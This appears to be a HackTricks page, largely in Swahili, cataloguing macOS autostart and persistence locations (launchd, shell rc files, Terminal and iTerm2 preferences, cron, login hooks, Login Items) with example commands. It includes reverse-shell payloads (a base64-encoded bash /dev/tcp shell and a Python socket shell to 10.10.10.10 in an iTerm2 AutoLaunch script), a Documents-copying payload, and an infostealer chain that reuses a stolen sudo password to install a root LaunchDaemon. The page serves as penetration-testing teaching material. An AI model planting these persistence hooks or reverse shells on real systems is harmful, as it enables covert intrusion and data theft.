# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Sehemu hii imejengwa kwa kiasi kikubwa kwenye mfululizo wa blogu [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), lengo likiwa kuongeza **Autostart Locations** zaidi (ikiwezekana), kuonyesha **ni mbinu zipi bado zinafanya kazi** siku hizi kwenye toleo jipya zaidi la macOS (13.4), na kubainisha **permissions** zinazohitajika.

## Sandbox Bypass

> [!TIP]
> Hapa unaweza kupata start locations zinazofaa kwa **sandbox bypass**, zinazokuruhusu kutekeleza kitu kwa urahisi kwa **kukiiandika kwenye file** na **kusubiri** **action** ya kawaida sana, **muda fulani**, au **action unayoweza kwa kawaida kutekeleza** ukiwa ndani ya sandbox bila kuhitaji root permissions.

### Launchd

- Inafaa kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root required
- **`/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root required
- **`/System/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root required
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root required
- **`~/Library/LaunchAgents`**
- **Trigger**: Relog-in
- **`~/Library/LaunchDemons`**
- **Trigger**: Relog-in

> [!TIP]
> Kama jambo la kuvutia, **`launchd`** ina property list iliyopachikwa kwenye Mach-o section `__Text.__config`, ambayo ina services nyingine zinazojulikana ambazo launchd lazima ianzishe. Zaidi ya hayo, services hizi zinaweza kuwa na `RequireSuccess`, `RequireRun` na `RebootOnSuccess`, kumaanisha kwamba lazima ziendeshwe na zikamilike kwa mafanikio.
>
> Bila shaka, haiwezi kurekebishwa kwa sababu ya code signing.

#### Description & Exploitation

**`launchd`** ni **process** ya kwanza inayotekelezwa na OX S kernel wakati wa startup na ya mwisho kumaliza wakati wa shut down. Inapaswa kuwa na **PID 1** kila wakati. Process hii **itasoma na kutekeleza** configurations zilizoonyeshwa kwenye **ASEP** **plists** zilizopo kwenye:

- `/Library/LaunchAgents`: Agents za kila user zilizowekwa na admin
- `/Library/LaunchDaemons`: Daemons za mfumo mzima zilizowekwa na admin
- `/System/Library/LaunchAgents`: Agents za kila user zinazotolewa na Apple.
- `/System/Library/LaunchDaemons`: Daemons za mfumo mzima zinazotolewa na Apple.

User anapoingia, plists zilizopo kwenye `/Users/$USER/Library/LaunchAgents` na `/Users/$USER/Library/LaunchDemons` huanzishwa kwa kutumia **permissions za user aliyeingia**.

**Tofauti kuu kati ya agents na daemons ni kwamba agents hupakiwa user anapoingia, huku daemons zikifakiwa wakati wa system startup** (kwa kuwa kuna services kama ssh zinazohitaji kutekelezwa kabla user yeyote hajafikia mfumo). Pia agents zinaweza kutumia GUI, huku daemons zikihitaji kuendeshwa background.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Kuna hali ambapo **agent inahitaji kutekelezwa kabla ya mtumiaji kuingia**, hizi huitwa **PreLoginAgents**. Kwa mfano, hii ni muhimu ili kutoa teknolojia saidizi wakati wa kuingia. Zinaweza pia kupatikana katika `/Library/LaunchAgents`(angalia [**hapa**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) kwa mfano).

> [!TIP]
> Faili mpya za usanidi wa Daemons au Agents **zitapakiwa baada ya kuwasha upya au kwa kutumia** `launchctl load <target.plist>` Pia **inawezekana kupakia faili za .plist bila extension hiyo** kwa `launchctl -F <file>` (hata hivyo faili hizo za plist hazitapakiwa kiotomatiki baada ya kuwasha upya).\
> Pia inawezekana **kuziondoa** kwa `launchctl unload <target.plist>` (process iliyoelekezwa nayo itasitishwa),
>
> Ili **kuhakikisha** kwamba hakuna **kitu chochote** (kama override) **kinachozuia** **Agent** au **Daemon** **kutekelezwa**, endesha: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Orodhesha agents na daemons zote zilizopakiwa na mtumiaji wa sasa:
```bash
launchctl list
```
#### Mfano wa mlolongo hasidi wa LaunchDaemon (password reuse)

Infostealer ya hivi karibuni ya macOS ilitumia tena **captured sudo password** kuweka user agent na LaunchDaemon ya root:<sup>[1]</sup>

- Andika agent loop kwenye `~/.agent` na uifanye iwe executable.
- Tengeneza plist katika `/tmp/starter` inayoelekeza kwenye agent hiyo.
- Tumia tena password iliyoibiwa kwa `sudo -S` ili kuinakili hadi `/Library/LaunchDaemons/com.finder.helper.plist`, weka `root:wheel`, kisha ipakie kwa `launchctl load`.
- Anzisha agent kimya kupitia `nohup ~/.agent >/dev/null 2>&1 &` ili kutenganisha output.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Ikiwa plist inamilikiwa na mtumiaji, hata ikiwa iko katika folders za daemon za mfumo mzima, **task itatekelezwa kama mtumiaji** na si kama root. Hii inaweza kuzuia baadhi ya mashambulizi ya privilege escalation.

#### Maelezo zaidi kuhusu launchd

**`launchd`** ni process ya kwanza ya user mode inayoanzishwa kutoka kwa **kernel**. Uanzishaji wa process lazima **ufaulu** na process hiyo **haiwezi kutoka au ku-crash**. Pia **inalindwa** dhidi ya baadhi ya **killing signals**.

Moja ya mambo ya kwanza ambayo `launchd` hufanya ni **kuanzisha** **daemons** zote kama vile:

- **Timer daemons** kulingana na muda wa kutekelezwa:
- atd (`com.apple.atrun.plist`): Ina `StartInterval` ya dakika 30
- crond (`com.apple.systemstats.daily.plist`): Ina `StartCalendarInterval` ya kuanza saa 00:15
- **Network daemons** kama:
- `org.cups.cups-lpd`: Inasikiliza TCP (`SockType: stream`) yenye `SockServiceName: printer`
- SockServiceName lazima iwe port au service kutoka `/etc/services`
- `com.apple.xscertd.plist`: Inasikiliza TCP kwenye port 1640
- **Path daemons** zinazotekelezwa path iliyobainishwa inapobadilika:
- `com.apple.postfix.master`: Inakagua path `/etc/postfix/aliases`
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: Inaonyesha katika entry ya `MachServices` jina `com.apple.xscertd.helper`
- **UserEventAgent:**
- Hii ni tofauti na ya awali. Inafanya launchd i-spawn apps kujibu event maalum. Hata hivyo, katika hali hii, binary kuu inayohusika si `launchd` bali `/usr/libexec/UserEventAgent`. Inapakia plugins kutoka kwenye folder iliyozuiwa na SIP `/System/Library/UserEventPlugins/`, ambapo kila plugin inaonyesha initialiser yake katika key ya `XPCEventModuleInitializer` au, kwa plugins za zamani, katika dict ya `CFPluginFactories` chini ya key `FB86416D-6164-2070-726F-70735C216EC0` ya `Info.plist` yake.

### faili za kuanzisha shell

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Inafaa kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Lakini unahitaji kupata app yenye TCC bypass inayotekeleza shell inayopakia mafaili haya

#### Maeneo

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: Fungua terminal yenye zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: Fungua terminal yenye zsh
- Root inahitajika
- **`~/.zlogout`**
- **Trigger**: Funga terminal yenye zsh
- **`/etc/zlogout`**
- **Trigger**: Funga terminal yenye zsh
- Root inahitajika
- Huenda kuna zaidi katika: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: Fungua terminal yenye bash
- `/etc/profile` (haikufanya kazi)
- `~/.profile` (haikufanya kazi)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: Ilitarajiwa ku-trigger na xterm, lakini **haijawekwa** na hata baada ya kuwekwa error hii hutokea: xterm: `DISPLAY is not set`<sup>[3]</sup>

#### Maelezo na Exploitation

Wakati wa kuanzisha mazingira ya shell kama `zsh` au `bash`, **faili fulani za kuanzisha huendeshwa**. Kwa sasa macOS hutumia `/bin/zsh` kama shell ya default. Shell hii inafikiwa kiotomatiki wakati app ya Terminal inapoanzishwa au wakati kifaa kinafikiwa kupitia SSH. Ingawa `bash` na `sh` pia zipo kwenye macOS, lazima ziitishwe wazi ili zitumike.<sup>[2]</sup>

Ukurasa wa man wa zsh, ambao tunaweza kuusoma kwa **`man zsh`**, una maelezo marefu kuhusu faili za kuanzisha.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Applications Zinazofunguliwa Tena

> [!CAUTION]
> Kusanidi exploitation iliyoonyeshwa na kufanya loging-out na loging-in au hata kuwasha upya hakukunisaidia kuendesha app. (App haikuwa ikiendeshwa, huenda inahitaji kuwa inaendeshwa wakati vitendo hivi vinafanywa)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: Kufungua tena applications baada ya restart

#### Maelezo na Exploitation

Applications zote za kufunguliwa tena ziko ndani ya plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[4]</sup>

Kwa hiyo, ili applications zinazofunguliwa tena zianzishe yako, unahitaji tu **kuongeza app yako kwenye list**.

UUID inaweza kupatikana kwa kuorodhesha directory hiyo au kwa kutumia `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Kuangalia applications zitakazofunguliwa tena unaweza kufanya:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Ili **kuongeza programu kwenye orodha hii** unaweza kutumia:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)

- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal hutumia ruhusa za FDA za mtumiaji anayeitumia

#### Location

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Kufungua Terminal

#### Description & Exploitation

Katika **`~/Library/Preferences`** huhifadhiwa preferences za mtumiaji katika Applications. Baadhi ya preferences hizi zinaweza kuwa na configuration ya **ku-execute applications/scripts** nyingine.<sup>[5]</sup>

Kwa mfano, Terminal inaweza ku-execute command wakati wa Startup:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Configuration hii inaonekana katika file **`~/Library/Preferences/com.apple.Terminal.plist`** kama ifuatavyo:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Kwa hivyo, ikiwa plist ya mapendeleo ya terminali kwenye mfumo inaweza kuandikwa upya, functionality ya **`open`** inaweza kutumika **kufungua terminali na amri hiyo itatekelezwa**.

Unaweza kuongeza hii kutoka kwenye CLI kwa kutumia:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Viendelezi vingine vya faili

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Matumizi ya Terminal ili kupata ruhusa za FDA za mtumiaji anayeitumia

#### Mahali

- **Popote**
- **Trigger**: Open Terminal

#### Maelezo & Exploitation

Ukiunda [**`.terminal` script**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) na kuifungua, **Terminal application** itaitishwa kiotomatiki ili kutekeleza commands zilizoonyeshwa humo. Ikiwa Terminal app ina privileges maalum (kama vile TCC), command yako itaendeshwa kwa privileges hizo maalum.

Ijaribu kwa:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Unaweza pia kutumia extensions **`.command`**, **`.tool`**, zikiwa na maudhui ya regular shell scripts, nazo pia zitafunguliwa na Terminal.

> [!CAUTION]
> Ikiwa Terminal ina **Full Disk Access**, itaweza kukamilisha kitendo hicho (kumbuka kuwa command iliyotekelezwa itaonekana kwenye terminal window).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Unaweza kupata TCC access ya ziada

#### Mahali

- **`/Library/Audio/Plug-Ins/HAL`**
- Root inahitajika
- **Trigger**: Anzisha upya coreaudiod au computer
- **`/Library/Audio/Plug-ins/Components`**
- Root inahitajika
- **Trigger**: Anzisha upya coreaudiod au computer
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: Anzisha upya coreaudiod au computer
- **`/System/Library/Components`**
- Root inahitajika
- **Trigger**: Anzisha upya coreaudiod au computer

#### Maelezo

Kulingana na writeups zilizotangulia, inawezekana **ku-compile baadhi ya audio plugins** na kuzifanya zipakiwe.<sup>[6][7]</sup>

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)

- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Unaweza kupata TCC access ya ziada

#### Mahali

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Maelezo na Exploitation

QuickLook plugins zinaweza kutekelezwa unapofanya **trigger ya preview ya file** (bonyeza space bar huku file ikiwa imechaguliwa kwenye Finder) na **plugin inayounga mkono aina hiyo ya file** ikiwa imewekwa.<sup>[8]</sup>

Inawezekana ku-compile QuickLook plugin yako mwenyewe, kuiweka katika mojawapo ya maeneo yaliyotajwa hapo awali ili ipakie, kisha uende kwenye file linaloungwa mkono na ubonyeze space ili ku-trigger.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Hii haikufanya kazi kwangu, si kwa user LoginHook wala kwa root LogoutHook

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- Lazima uweze kutekeleza kitu kama `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- `Lo`cated katika `~/Library/Preferences/com.apple.loginwindow.plist`

Zimepitwa na wakati, lakini zinaweza kutumika kutekeleza commands user anapo-login.<sup>[9]</sup>
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Mpangilio huu huhifadhiwa katika `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Ili kuifuta:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Ile ya root user imehifadhiwa katika **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Hapa unaweza kupata maeneo ya kuanzia yanayofaa kwa **sandbox bypass**, yanayokuruhusu kutekeleza kitu kwa **kukiiandika kwenye file** na **kutegemea hali zisizo za kawaida sana**, kama vile **programu maalum zilizowekwa, vitendo vya mtumiaji "visivyo vya kawaida"** au mazingira.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Inafaa kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Hata hivyo, lazima uweze kutekeleza binary ya `crontab`
- Au uwe root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Root inahitajika ili kuandika moja kwa moja. Root haihitajiki ikiwa unaweza kutekeleza `crontab <file>`
- **Trigger**: Inategemea cron job

#### Maelezo na Exploitation

Orodhesha cron jobs za **mtumiaji wa sasa** kwa:
```bash
crontab -l
```
Unaweza pia kuona cron jobs zote za users katika **`/usr/lib/cron/tabs/`** na **`/var/at/tabs/`** (inahitajika root).

Katika MacOS, folders kadhaa zinazoendesha scripts kwa **frequency fulani** zinaweza kupatikana katika:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Hapo unaweza kupata **cron** **jobs** za kawaida, **at** **jobs** (hazitumiki sana) na **periodic** **jobs** (hutumiwa hasa kusafisha faili za muda). **periodic jobs** za kila siku zinaweza kutekelezwa, kwa mfano, kwa: `periodic daily`.<sup>[10]</sup>

Ili kuongeza **user cronjob programatically**, inawezekana kutumia:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 iliwahi kuwa na ruhusa za TCC zilizotolewa

#### Maeneo

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Kichochezi**: Kufungua iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Kichochezi**: Kufungua iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Kichochezi**: Kufungua iTerm

#### Maelezo na Exploitation

Scripts zilizohifadhiwa katika **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** zitatekelezwa. Kwa mfano:<sup>[11]</sup>
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
au:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** pia itatekelezwa:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Mapendeleo ya iTerm2 yaliyo katika **`~/Library/Preferences/com.googlecode.iterm2.plist`** yanaweza **kuonyesha command ya kutekeleza** terminal ya iTerm2 inapofunguliwa.

Mpangilio huu unaweza kusanidiwa katika mipangilio ya iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Na command hiyo huonyeshwa kwenye mapendeleo:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Unaweza kuweka command ya kutekeleza kwa:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Kuna uwezekano mkubwa wa kuwepo **njia nyingine za kutumia vibaya mapendeleo ya iTerm2** ili kutekeleza amri holela.

### xbar

Maelezo: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Muhimu kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini xbar lazima iwe imesakinishwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Huomba ruhusa za Accessibility

#### Mahali

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Kichochezi**: Mara tu xbar inapotekelezwa

#### Maelezo

Ikiwa programu maarufu [**xbar**](https://github.com/matryer/xbar) imesakinishwa, inawezekana kuandika shell script katika **`~/Library/Application\ Support/xbar/plugins/`**, ambayo itatekelezwa xbar inapoanzishwa:<sup>[12]</sup>
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Muhimu kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini Hammerspoon lazima iwe imesakinishwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Huomba ruhusa za Accessibility

#### Mahali

- **`~/.hammerspoon/init.lua`**
- **Kichochezi**: Mara hammerspoon inapotekelezwa

#### Maelezo

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) hutumika kama jukwaa la automation kwa **macOS**, likitumia **LUA scripting language** kwa shughuli zake. Muhimu zaidi, linaunga mkono ujumuishaji wa AppleScript code kamili na utekelezaji wa shell scripts, jambo linaloboresha kwa kiasi kikubwa uwezo wake wa scripting.<sup>[13]</sup>

Programu hutafuta faili moja, `~/.hammerspoon/init.lua`, na inapoanzishwa script hiyo itatekelezwa.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Inafaa ku-bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini BetterTouchTool lazima iwe installed
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Huomba ruhusa za Automation-Shortcuts na Accessibility

#### Mahali

- `~/Library/Application Support/BetterTouchTool/*`

Tool hii inaruhusu kubainisha applications au scripts za ku-execute wakati shortcuts fulani zinapobanwa. Attacker anaweza kuwa na uwezo wa kusanidi **shortcut na action ya ku-execute kwenye database** ili ku-execute arbitrary code (shortcut inaweza kuwa kubana key moja tu).

### Alfred

- Inafaa ku-bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini Alfred lazima iwe installed
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Huomba ruhusa za Automation, Accessibility na hata Full-Disk access

#### Mahali

- `???`

Inaruhusu kuunda workflows zinazoweza ku-execute code wakati conditions fulani zimetimizwa. Kinadharia, attacker anaweza kuunda workflow file na kufanya Alfred i-load (inahitajika kulipia premium version ili kutumia workflows).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Inafaa ku-bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini ssh inahitaji kuwa enabled na kutumiwa
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH hutumia kuwa na FDA access

#### Mahali

- **`~/.ssh/rc`**
- **Trigger**: Login kupitia ssh
- **`/etc/ssh/sshrc`**
- Root inahitajika
- **Trigger**: Login kupitia ssh

> [!CAUTION]
> Ili kuwasha ssh, inahitaji Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Maelezo na Exploitation

Kwa default, isipokuwa kama `PermitUserRC no` ipo kwenye `/etc/ssh/sshd_config`, mtumiaji **anapo-login kupitia SSH**, scripts **`/etc/ssh/sshrc`** na **`~/.ssh/rc`** zita-execute.<sup>[14]</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Inafaa ku-bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Lakini unahitaji ku-execute `osascript` yenye args
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Maeneo

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Login
- Exploit payload iliyohifadhiwa ikiita **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Login
- Root inahitajika

#### Maelezo

Katika System Preferences -> Users & Groups -> **Login Items**, unaweza kupata **items zitakazo-execute mtumiaji anapo-login**.\
Inawezekana kuzi-list, kuziongeza na kuziondoa kutoka command line:<sup>[15]</sup>
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Vipengee hivi huhifadhiwa kwenye faili **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Login items** zinaweza pia kuonyeshwa kwa kutumia API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), ambayo itahifadhi configuration kwenye **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP kama Login Item

(Angalia sehemu iliyotangulia kuhusu Login Items; hii ni extension)

